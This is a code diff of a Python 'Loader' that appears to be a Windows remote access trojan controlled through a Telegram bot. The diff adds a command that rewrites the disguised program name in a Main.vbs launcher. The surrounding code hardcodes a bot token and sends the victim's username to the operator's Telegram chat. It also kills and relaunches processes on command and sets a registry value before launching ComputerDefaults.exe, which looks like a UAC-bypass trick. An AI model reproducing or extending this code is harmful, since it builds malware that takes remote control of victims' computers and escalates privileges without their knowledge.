@@ -13,6 +13,7 @@ import ctypes
 import itertools
 import psutil
 import threading
+import re
 class Loader():
     def __init__(self):
         self.token = "1867535261:AAG_wC07CxlM4ga5UfcA2eE_Jxxm9efPcG8"
@@ -75,7 +76,7 @@ class Loader():
                         message += "--" + getpass.getuser() + "--"
                         self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "&chat_id=" + self.chat_id)
                     elif command == "/restart" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
-                        filename = __file__.split("\\")
+                        filename = os.path.abspath(__file__).split("\\")
                         filename.pop()
                         filename = "\\".join(filename) + "\\Main.vbs"
                         os.system("cmd.exe /c taskkill /F /IM python.exe & " + filename)
@@ -118,9 +119,25 @@ class Loader():
                         dirname = "wscript.exe \"" + "\\".join(dirname) + "\\Main.vbs\""
                         SetValueEx(registry_key, None, 0, REG_SZ, dirname)
                         CloseKey(registry_key)
-                        print("aa")
                         os.system("ComputerDefaults.exe")
                         exit();
+                    elif command == "/change_prog" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
+                        spl = message['text'].split(" ")
+                        spl.remove(spl[0])
+                        spl.pop()
+                        prog = " ".join(spl)
+                        dirname = os.path.abspath(__file__).split("\\")
+                        dirname.pop()
+                        filename =  "\\".join(dirname) + "\\Main.vbs"
+                        file = open(filename,"r")
+                        read = file.read()
+                        file.close()
+                        read = read.replace(re.findall('" ""(.*?)""',read)[0],prog)
+                        file = open(filename,"w")
+                        file.write(read)
+                        file.close()
+                        self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=%E2%9C%94%EF%B8%8F Program Name Changed \n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
+
                 else:
                     file_id = message['document']['file_id']
                     caption = message['caption']
